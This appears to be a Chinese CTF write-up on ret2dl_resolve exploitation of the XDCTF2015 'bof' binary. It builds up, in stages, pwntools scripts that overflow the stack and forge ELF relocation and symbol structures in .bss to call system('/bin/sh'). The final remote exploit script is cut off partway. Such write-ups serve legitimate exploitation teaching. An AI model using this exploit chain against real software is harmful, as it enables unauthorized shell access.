<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reloc_index=<span class="number">0x20</span>                <span class="comment">#reloc_index</span></span><br><span class="line">payload3=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(plt_0)            <span class="comment">#jump to PLT[0]  </span></span><br><span class="line">payload3+=p32(reloc_index)      <span class="comment">#push 0x20     #注意该值已经被写入栈中了，jmp plt[0]就会在其上面压栈，然后调用_dl_runtime_resolve，和调用write@plt的效果一样</span></span><br><span class="line">payload3+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(<span class="number">1</span>)+p32(base_addr+<span class="number">80</span>)+p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload3))   <span class="comment">#padding 80  </span></span><br><span class="line">payload3+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#bss_addr+80</span></span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload3))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236516.png" alt="image-20220628200541655"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236517.png" alt="image-20220628204314256"></p>
<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>然后在bss段中伪造一个<code>Elf Rel</code>结构，r_offset此成员给出了需要重定位的位置,可将<code>r_offset</code> 设置成<code>write@got</code> 的地址，表示解析后的真实地址填入这里。<code>r_info</code>直接照搬，设置成0x607，动态加载器会通过这个值找到对应的<code>Elf Sym</code>。那么现在<code>reloc_index</code>就不再是0x20了，应该调整为fake reloc距离.rel.plt的距离。</p>
<p>fake reloc是在base_addr+28的位置（28是由于前面有7个p32),则reloc_index=base_addr+28-rel_plt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bss_addr:&quot;</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got:&quot;</span>,<span class="built_in">hex</span>(write_got))</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reloc_index = base_addr + <span class="number">28</span> - rel_plt  <span class="comment"># fake_reloc = base_addr + 28</span></span><br><span class="line"></span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_reloc:&quot;</span>,<span class="built_in">hex</span>(u64(fake_reloc)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(plt_0)            <span class="comment">#jump to PLT[0]</span></span><br><span class="line">payload3+=p32(reloc_index)      </span><br><span class="line">payload3+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(<span class="number">1</span>)+p32(base_addr+<span class="number">80</span>)+p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload3+=fake_reloc</span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload3))   <span class="comment">#padding 80  </span></span><br><span class="line">payload3+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#bss_addr+80</span></span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload3))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236518.png" alt="image-20220628212907242"></p>
<h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a><strong>stage4</strong></h5><p>这一次构造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code>  </p>
<p>在.bss段上伪造一个Elf_Sym。先查看write()函数 在.dynsym段上的位置，然后objdump找到下标为6那一行，将其照 搬过去就可以了。动态加载器会通过st_name找到.dynstr段中的函数名字符串“write”。 </p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236519.png" alt="image-20220628215925708"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_sym = p32(0x4c) + p32(0) + p32(0) + p32(0x12)</span><br></pre></td></tr></table></figure>

<p>Elf_Sym结构体可见上文标题_DYNAMIC-&gt;DT_SYMTAB处</p>
<p>相应地，fake_reloc也要做调整，r_info可以通过r_sym和r_type计算得出。其中，r_sym是Elf_Sym相对于.dynsym段的下标偏移，r_type则照搬R_386_JUMP_SLOT的值0x7。 </p>
<p><code>#define ELF32_R_INFO(sym, type)     (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bss_addr:&quot;</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got:&quot;</span>,<span class="built_in">hex</span>(write_got))</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reloc_index = base_addr + <span class="number">28</span> - rel_plt  <span class="comment"># fake_reloc = base_addr + 28</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span> <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=((r_sym) &lt;&lt; <span class="number">8</span>) + ((r_type) &amp; <span class="number">0xff</span>)</span><br><span class="line">fake_reloc=p32(write_got) + p32(r_info)</span><br><span class="line">fake_sym = p32(<span class="number">0x4c</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(plt_0)            <span class="comment">#jump to PLT[0]</span></span><br><span class="line">payload3+=p32(reloc_index)      </span><br><span class="line">payload3+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(<span class="number">1</span>)+p32(base_addr+<span class="number">80</span>)+p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload3+=fake_reloc</span><br><span class="line">payload3+=<span class="string">&#x27;B&#x27;</span>*align</span><br><span class="line">payload3+=fake_sym                              </span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload3))   <span class="comment">#padding 80  </span></span><br><span class="line">payload3+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#bss_addr+80</span></span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload3))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236520.png" alt="image-20220628220757640"></p>
<h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>在.bss段上伪造.dynstr，也就是放上“write”字符串。 相应地，调整fake_sym的st_name指向伪造的函数名字符串，然后还可以通过st_bind和st_type来计算st_info。详情可见标题：_DYNAMIC-&gt;DT_SYMTAB</p>
<p><code>#define ELF32_ST_INFO(bind, type)   (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</code>这里bind 和type看情况改，也可以不改。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x600</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bss_addr:&quot;</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_got:&quot;</span>,<span class="built_in">hex</span>(write_got))</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reloc_index = base_addr + <span class="number">28</span> - rel_plt  <span class="comment"># fake_reloc = base_addr + 28</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>        <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=((r_sym) &lt;&lt; <span class="number">8</span>) + ((r_type) &amp; <span class="number">0xff</span>)</span><br><span class="line">fake_reloc=p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class="line">st_bind=<span class="number">0x1</span></span><br><span class="line">st_type=<span class="number">0x2</span></span><br><span class="line">st_info=((st_bind) &lt;&lt; <span class="number">4</span>) + ((st_type) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(plt_0)            <span class="comment">#jump to PLT[0]</span></span><br><span class="line">payload3+=p32(reloc_index)    </span><br><span class="line">payload3+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(<span class="number">1</span>)+p32(base_addr+<span class="number">80</span>)+p32(<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload3+=fake_reloc</span><br><span class="line">payload3+=<span class="string">&#x27;B&#x27;</span>*align</span><br><span class="line">payload3+=fake_sym   </span><br><span class="line">payload3+=<span class="string">&quot;write\x00&quot;</span>                           </span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload3))   <span class="comment">#padding 80  </span></span><br><span class="line">payload3+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#bss_addr+80</span></span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload3))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236521.png" alt="image-20220628221532704"></p>
<h5 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h5><p>最后只需将字符串”write”和”system”，并调整一下参数即可获得shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">reloc_index = base_addr + <span class="number">28</span> - rel_plt  <span class="comment"># fake_reloc = base_addr + 28</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>        <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=((r_sym) &lt;&lt; <span class="number">8</span>) + ((r_type) &amp; <span class="number">0xff</span>)</span><br><span class="line">fake_reloc=p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class="line">st_bind=<span class="number">0x1</span></span><br><span class="line">st_type=<span class="number">0x2</span></span><br><span class="line">st_info=((st_bind) &lt;&lt; <span class="number">4</span>) + ((st_type) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(st_info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(plt_0)            <span class="comment">#jump to PLT[0]</span></span><br><span class="line">payload3+=p32(reloc_index)     </span><br><span class="line">payload3+=<span class="string">&quot;AAAA&quot;</span></span><br><span class="line">payload3+=p32(base_addr+<span class="number">80</span>)</span><br><span class="line">payload3+=<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload3+=<span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload3+=fake_reloc</span><br><span class="line">payload3+=<span class="string">&#x27;B&#x27;</span>*align</span><br><span class="line">payload3+=fake_sym   </span><br><span class="line">payload3+=<span class="string">&quot;system\x00&quot;</span>                           </span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">80</span>-<span class="built_in">len</span>(payload3))   <span class="comment">#padding 80  </span></span><br><span class="line">payload3+=<span class="string">&quot;/bin/sh\x00&quot;</span>            <span class="comment">#bss_addr+80</span></span><br><span class="line">payload3+=<span class="string">&quot;a&quot;</span>*(<span class="number">100</span>-<span class="built_in">len</span>(payload3))  <span class="comment">#padding 100</span></span><br><span class="line">p.sendline(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236522.png" alt="image-20220628224103118"></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./bof&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29858</span>)</span><br><span class="line"></span><br><span class="line">ppp_addr      = <span class="number">0x08048629</span>     <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">ebp_ret   = <span class="number">0x0804862b</span>     <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048445</span>     <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt  = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0    = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr        </span><br><span class="line">rel_plt  = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr    </span><br><span class="line">dynsym   = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr    </span><br><span class="line">dynstr   = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr     </span><br><span class="line">bss_addr = elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr       </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是初始化取那三个表地址，plt0是我刚解释过的带linkmap然后jmp到_dl_runtime_resolve的，没有他我们无法进行解析</span></span><br><span class="line"><span class="string">我将上述代码分为两个部分，一部分为取地址初始化，第二部分才为构造，开头先取各个表的地址，至于为什么要.header.sh_addr这里是因为e这是elf的section header部分，他表里有个字段叫sh_addr</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">base_addr = bss_addr + <span class="number">0x800</span>    <span class="comment"># 0x804a628</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)                </span><br><span class="line">payload1+=p32(read_plt)              <span class="comment">#read(0,bss_addr,100)</span></span><br><span class="line">payload1+=p32(ppp_addr)              <span class="comment">#clean the stack </span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)+p32(base_addr)+p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(ebp_ret)</span><br><span class="line">payload1+=p32(base_addr)              <span class="comment">#ebp</span></span><br><span class="line">payload1+=p32(leave_ret)             <span class="comment">#mov esp,ebp;pop ebp;pop eip</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">reloc_index = base_addr + <span class="number">28</span> - rel_plt  <span class="comment"># fake_reloc = base_addr + 28</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr = base_addr + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line"></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>        <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=((r_sym) &lt;&lt; <span class="number">8</span>) + ((r_type) &amp; <span class="number">0xff</span>)</span><br><span class="line">fake_reloc=p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class="line">st_bind=<span class="number">0x1</span></span><br><span 